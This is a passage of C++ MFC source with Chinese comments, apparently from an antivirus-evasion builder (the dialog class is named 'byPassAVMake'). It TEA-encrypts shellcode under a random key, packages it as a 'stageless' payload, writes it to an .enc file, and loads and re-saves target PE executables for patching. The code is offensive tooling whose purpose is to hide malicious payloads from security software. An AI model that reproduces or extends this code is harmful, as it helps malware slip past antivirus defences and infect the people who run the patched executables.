	else if (IsDlgButtonChecked(IDC_RADIO4))
	{
		//封装加密类型
		encPacket.append(H_ENC_TEA);

		//封装SCPacket
		ByteBuffer scPacket;
		scPacket.append(P_TYPE_STAGELESSURL);
		scPacket.append(STu32(shellcode.size()));
		scPacket.append(shellcode.contents(), shellcode.size());

		//tea加密
		//随机生成密钥
		STu8 TEA_KEY[0x10];
		Randomkey(TEA_KEY, sizeof(TEA_KEY));
		unsigned char* out = 0;
		unsigned int outlen = 0;
		tea_encrypt((unsigned char*)(scPacket.contents()), scPacket.size(), TEA_KEY, &out, &outlen);

		//封装密钥
		encPacket.append(TEA_KEY, sizeof(TEA_KEY));
		//封装加密数据
		encPacket.append(STu32(outlen));
		encPacket.append(out, outlen);
		free(out);
	}

	//加密数据保存到文件
	binFile += ".enc";
	CFile mFile(binFile, CFile::modeCreate | CFile::modeReadWrite);
	mFile.Write(encPacket.contents(), encPacket.size());
	mFile.Close();
	AfxMessageBox("保存成功");
}

//取消按钮事件
void CbyPassAVMakeDlg::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码
	CDialogEx::OnCancel();
}

//选择补丁文件
void CbyPassAVMakeDlg::OnBnClickedButton3()
{
	// TODO: 在此添加控件通知处理程序代码
	CFileDialog dlg(TRUE, "*.*", NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, "(*.*)|*.*||");
	if (dlg.DoModal() == IDOK)
	{
		mFileBin.SetWindowTextA(dlg.GetPathName());
		CString binFile = "";
		mFileBin.GetWindowTextA(binFile);
		HANDLE mHandle = CreateFile(binFile.GetBuffer(0), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == mHandle)
		{
			AfxMessageBox("文件打开失败!");
			return;
		}

		DWORD dwSizeHigh = 0, dwSizeLow = 0;
		dwSizeLow = GetFileSize(mHandle, &dwSizeHigh);
		if (dwSizeLow == INVALID_FILE_SIZE || dwSizeHigh != 0)
		{
			CloseHandle(mHandle);
			AfxMessageBox("文件太大!");
			return;
		}
		STu8* pVirMem = MemMgr::GetInstance().CommonAlloc(TypeSGIVirtualAllocTAlloc, dwSizeLow);
		if (pVirMem == NULL)
		{
			CloseHandle(mHandle);
			AfxMessageBox("内存分配失败!");
			return;
		}

		DWORD readsize;
		if (!ReadFile(mHandle, pVirMem, dwSizeLow, &readsize, NULL))
		{
			CloseHandle(mHandle);
			AfxMessageBox("文件读取失败!");
			return;
		}
		CloseHandle(mHandle);
		InitDisaDate(pVirMem, readsize);
		MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);
		UpdateData(FALSE);
	}
}

//选择目标PE文件
void CbyPassAVMakeDlg::OnBnClickedButton4()
{
	// TODO: 在此添加控件通知处理程序代码
	CFileDialog dlg(TRUE, "*.*", NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, "(*.*)|*.*||");
	if (dlg.DoModal() == IDOK)
	{
		mDstFile.SetWindowTextA(dlg.GetPathName());
		CString exeFile = "";
		mDstFile.GetWindowTextA(exeFile);
		if (!mPEMake.PELoadFile(exeFile.GetBuffer(0), "r"))     //只读方式打开文件
		{
			::MessageBox(this->m_hWnd, "PE文件加载失败", "警告", MB_OK);
			return;
		}

		if (!mPEMake.CheckPESig())
		{
			::MessageBox(this->m_hWnd, "PE文件错误", "警告", MB_OK);
			return;
		}

		if (mPEMake.Analysis())
		{
			mPEMake.SetAnalysised(true);
		}
		else
		{
			mPEMake.SetAnalysised(false);
			return;
		}
		UpdateData(FALSE);
	}
}

//文件-另存为
void CbyPassAVMakeDlg::OnSaveAs()
{
	if (!mPEMake.isAnalysised())
	{
		AfxMessageBox("请先分析PE文件");
		return;
	}
	CFileDialog dlg(FALSE, "exe", mPEMake.mPeCtx.path.c_str(), OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, "TXT Files(*.exe)|*.exe|All Files(*.*)|*.*");
	///TRUE为OPEN对话框，FALSE为SAVE AS对话框  
	if (dlg.DoModal() == IDOK)
	{
		CFile mFile(dlg.GetPathName(), CFile::modeCreate | CFile::modeReadWrite);
		mFile.Write(mPEMake.mPeCtx.pVirMem, mPEMake.mPeCtx.size);
		mFile.Close();
		AfxMessageBox("另存成功");
	}

}

